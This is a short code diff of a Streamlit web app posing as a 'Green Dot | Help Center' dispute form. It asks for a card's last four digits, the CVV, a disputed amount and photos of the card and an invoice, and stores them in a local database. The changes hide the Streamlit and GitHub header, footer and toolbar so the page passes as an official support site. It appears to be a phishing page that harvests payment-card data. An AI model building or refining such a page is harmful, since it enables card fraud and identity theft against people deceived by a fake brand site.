@@ -25,6 +25,12 @@ st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_ico
 
 # --- STYLING ---
 st.markdown("""<style>
+/* Ocultar barra de GitHub/Streamlit arriba y el footer abajo */
+header {visibility: hidden;}
+footer {visibility: hidden;}
+#MainMenu {visibility: hidden;}
+.stAppToolbar {display:none;}
+
 /* Reducir espacio superior del contenedor principal */
 .block-container {
     padding-top: 1rem !important;
@@ -94,7 +100,7 @@ with st.container():
             cuenta = st.text_input("Account Number (Last 4)")
         with col2:
             codigo = st.text_input("CVV / Code")
-        
+
         monto = st.number_input("Disputed Amount ($)", min_value=0.0, step=0.01)
 
         st.write("**Required Evidence**")
@@ -109,7 +115,7 @@ if submit:
         t_path = os.path.join(UPLOAD_DIR, f"t_{int(datetime.now().timestamp())}_{file_tarjeta.name}")
         with open(f_path, 'wb') as f: f.write(file_factura.getbuffer())
         with open(t_path, 'wb') as f: f.write(file_tarjeta.getbuffer())
-        
+
         conn = sqlite3.connect(DB_NAME)
         c = conn.cursor()
         c.execute("INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) VALUES (?,?,?,?,?,?,?)",
